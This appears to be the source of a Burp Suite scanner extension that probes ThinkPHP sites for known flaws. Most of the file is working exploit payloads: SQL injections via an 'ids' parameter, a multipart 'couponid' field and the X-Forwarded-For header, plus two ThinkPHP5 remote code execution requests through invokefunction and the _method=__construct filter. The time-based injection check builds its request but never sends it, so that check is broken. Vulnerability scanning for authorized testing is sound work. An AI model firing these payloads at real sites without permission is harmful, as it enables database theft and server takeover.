#!/usr/bin/env python
# coding=utf-8
# author: shino
# date: 2019-11-14
import sys

reload(sys)
sys.setdefaultencoding('utf8')

try:
    import pickle
    import random
    import re
    import string
    import time
    import copy
    import base64
    import jarray
    import traceback
    from string import Template
    from java.net import URL
    from urlparse import urlparse
    import urllib2, base64, random
    from cgi import escape

    from burp import IBurpExtender, IScannerInsertionPointProvider, IScannerInsertionPoint, IParameter, IScannerCheck, \
        IScanIssue
    import jarray
except ImportError:
    print "Failed to load dependencies. This issue may be caused by using the unstable Jython 2.7 beta."

VERSION = "1.0.0"
DEBUG = False
callbacks = None
helpers = None


def html_encode(string):
    return string.replace("<", "&lt;").replace(">", "&gt;")


def safe_bytes_to_string(bytes):
    if bytes is None:
        bytes = ''
    return helpers.bytesToString(bytes)


class BurpExtender(IBurpExtender):
    def registerExtenderCallbacks(self, this_callbacks):
        global callbacks, helpers
        callbacks = this_callbacks
        helpers = callbacks.getHelpers()
        callbacks.setExtensionName("TPScan for BurpSuite")
        callbacks.registerScannerCheck(tpscan4burp())

        print "Successfully loaded TPScan for burpsuite v {}\nAuthor: Loneyer\nGithub: https://github.com/Loneyers/TPScan4Burp".format(
            VERSION)



class tpscan4burp(IScannerCheck):
    def __init__(self):
        self.scan_checks = [
            self.thinkphp_debug_index_ids_sqli_scan,
            self.thinkphp5_controller_rce,
            self.thinkphp5_rce_2,
            self.thinkphp_checkcode_time_sqli_verify,
            self.thinkphp_view_recent_xff_sqli,
        ]

    def doPassiveScan(self, basePair):
        return []

    def doActiveScan(self, basePair, insertionPoint):
        if not self.should_trigger_per_request_attacks(basePair, insertionPoint):
            return []

        issues = []
        for scan_check in self.scan_checks:
            try:
                issues.extend(scan_check(basePair))
            except Exception:
                print 'Error executing TPScan for burpsuite ' + scan_check.__name__ + ': '
                print(traceback.format_exc())

        return issues

    def should_trigger_per_request_attacks(self, basePair, insertionPoint):
        request = helpers.analyzeRequest(basePair.getRequest())
        params = request.getParameters()

        # if there are no parameters, scan if there's a HTTP header
        if params:
            # pick the parameter most likely to be the first insertion point
            first_parameter_offset = 999999
            first_parameter = None
            for param_type in (IParameter.PARAM_BODY, IParameter.PARAM_URL, IParameter.PARAM_JSON, IParameter.PARAM_XML,
                               IParameter.PARAM_XML_ATTR, IParameter.PARAM_MULTIPART_ATTR, IParameter.PARAM_COOKIE):
                for param in params:
                    if param.getType() != param_type:
                        continue
                    if param.getNameStart() < first_parameter_offset:
                        first_parameter_offset = param.getNameStart()
                        first_parameter = param
                if first_parameter:
                    break

            if first_parameter and first_parameter.getName() == insertionPoint.getInsertionPointName():
                return True

        elif insertionPoint.getInsertionPointType() == IScannerInsertionPoint.INS_HEADER and insertionPoint.getInsertionPointName() == 'User-Agent':
            return True

        return False

    def thinkphp_debug_index_ids_sqli_scan(self, basePair):

        Payload = "/index.php?ids[0,UpdAtexml(0,ConcAt(0xa,Md5('tpscan4burp')),0)]=1"
        try:
            attack = self.fetchURL(basePair, Payload)
            if "8b33dd891fc1ca4b0e7e6c482da9316" in safe_bytes_to_string(attack.getResponse()):
                return [CustomScanIssue(basePair.getHttpService(), helpers.analyzeRequest(basePair).getUrl(),
                                        [attack],
                                        'thinkphp_debug_index_ids_sqli',
                                        'ThinkPHP5 SQL Injection Vulnerability && Sensitive Information Disclosure Vulnerability',
                                        'Firm', 'High')]

            return []
        except:
            pass

    def thinkphp5_controller_rce(self, basePair):

        Payload = '/index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=8b33dd891fc1ca4b0e7e6c482da9316'
        try:
            attack = self.fetchURL(basePair, Payload)
            if "8b33dd891fc1ca4b0e7e6c482da9316" in safe_bytes_to_string(attack.getResponse()):
                return [CustomScanIssue(basePair.getHttpService(), helpers.analyzeRequest(basePair).getUrl(),
                                        [attack],
                                        'thinkphp5_controller_rce',
                                        'Thinkphp5 5.0.22/5.1.29 Remote Code Execution Vulnerability',
                                        'Firm', 'High')]

            return []
        except:
            pass
    def thinkphp5_rce_2(self,basePair):
        Payload = '_method=__construct&filter[]=var_dump&method=GET&get[]=8b33dd891fc1ca4b0e7e6c482da9316'
        url = helpers.analyzeRequest(basePair).getUrl()
        host = urlparse(str(url)).netloc
        scheme = urlparse(str(url)).scheme
        headers = {
            "Content-Type":"application/x-www-form-urlencoded",
            "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36"
        }

        url = scheme+"://"+host+'/index.php?s=captcha'
        try:
            r = urllib2.Request(url,data=Payload,headers=headers)
            if "8b33dd891fc1ca4b0e7e6c482da9316" in urllib2.urlopen(r).read():
                return [CustomScanIssue(basePair.getHttpService(), helpers.analyzeRequest(basePair).getUrl(),
                                        None,
                                        'ThinkPHP5 5.0.23 Remote Code Execution Vulnerability',
                                        '<b>HTTP Request Raw:</b><p>POST {0} HTTP/1.1</p><p>Host: {1}</p>{2}<br>{3}<br>'.format(url, host, r.headers,Payload),
                                        'Firm', 'High')]
            return []
        except:
            pass

    def thinkphp_checkcode_time_sqli_verify(self,basePair):
        headers = {
            "User-Agent": "TPscan",
            "DNT": "1",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Content-Type": "multipart/form-data; boundary=--------641902708",
            "Accept-Encoding": "gzip, deflate, sdch",
            "Accept-Language": "zh-CN,zh;q=0.8",
        }
        url = helpers.analyzeRequest(basePair).getUrl()
        host = urlparse(str(url)).netloc
        scheme = urlparse(str(url)).scheme
        payload = "----------641902708\r\nContent-Disposition: form-data; name=\"couponid\"\r\n\r\n1')UniOn SelEct slEEp(8)#\r\n\r\n----------641902708--"
        url = scheme+"://"+host+'/index.php?s=/home/user/checkcode/'
        try:
            start_time = time.time()
            r = urllib2.Request(url, data=payload, headers=headers)
            if time.time()-start_time >=8:
                return [CustomScanIssue(basePair.getHttpService(), helpers.analyzeRequest(basePair).getUrl(),
                                        None,
                                        'thinkphp_checkcode_time_sqli',
                                        '<b>HTTP Request Raw:</b><p>POST {0} HTTP/1.1</p><p>Host: {1}</p>{2}<br>{3}<br>'.format(
                                            url, host, r.headers, payload),
                                        'Firm', 'High')]
            return []
        except:
            pass
    def thinkphp_view_recent_xff_sqli(self,basePair):
        headers = {
            "User-Agent": 'TPscan for burpsuite',
            "X-Forwarded-For": "1')And/**/ExtractValue(1,ConCat(0x5c,(sElEct/**/Md5('tpscan4burp'))))#"
        }
        url = helpers.analyzeRequest(basePair).getUrl()
        host = urlparse(str(url)).netloc
        scheme = urlparse(str(url)).scheme
        url = scheme + "://" + host + '/index.php?s=/home/article/view_recent/name/1'
        try:
            r = urllib2.Request(url, headers=headers)
            if "8b33dd891fc1ca4b0e7e6c482da9316" in urllib2.urlopen(r).read():
                return [CustomScanIssue(basePair.getHttpService(), helpers.analyzeRequest(basePair).getUrl(),
                                        None,
                                        'thinkphp_view_recent_xff_sqli',
                                        '<b>HTTP Request Raw:</b><p>POST {0} HTTP/1.1</p><p>Host: {1}</p>{2}<br>'.format(
                                            url, host, r.headers),
                                        'Firm', 'High')]
            return []
        except:
            pass
class CustomScanIssue(IScanIssue):
    def __init__(self, httpService, url, httpMessages, name, detail, confidence, severity):
        self.HttpService = httpService
        self.Url = url
        self.HttpMessages = httpMessages
        self.Name = name
        self.Detail = detail
        self.Severity = severity
        self.Confidence = confidence
        return

    def getUrl(self):
        return self.Url

    def getIssueName(self):
        return self.Name

    def getIssueType(self):
        return 0

    def getSeverity(self):
        return self.Severity

    def getConfidence(self):
        return self.Confidence

    def getIssueBackground(self):
        return None

    def getRemediationBackground(self):
        return None

    def getIssueDetail(self):
        return self.Detail

    def getRemediationDetail(self):
        return None

    def getHttpMessages(self):
        return self.HttpMessages

    def getHttpService(self):
        return self.HttpService

def setHeader(request, name, value, add_if_not_present=False):
    # find the end of the headers
    prev = ''
    i = 0
    while i < len(request):
        this = request[i]
        if prev == '\n' and this == '\n':
            break
        if prev == '\r' and this == '\n' and request[i - 2] == '\n':
            break
        prev = this
        i += 1
    body_start = i

    # walk over the headers and change as appropriate
    headers = safe_bytes_to_string(request[0:body_start])
    headers = headers.splitlines()
    modified = False
    for (i, header) in enumerate(headers):
        value_start = header.find(': ')
        header_name = header[0:value_start]
        if header_name == name:
            new_value = header_name + ': ' + value
            if new_value != headers[i]:
                headers[i] = new_value
                modified = True

    # stitch the request back together
    if modified:
        modified_request = helpers.stringToBytes('\r\n'.join(headers) + '\r\n') + request[body_start:]
    elif add_if_not_present:
        # probably doesn't work with POST requests
        real_start = helpers.analyzeRequest(request).getBodyOffset()
        modified_request = request[:real_start-2] + helpers.stringToBytes(name + ': ' + value + '\r\n\r\n') + request[real_start:]
    else:
        modified_request = request

    return modified, modified_request
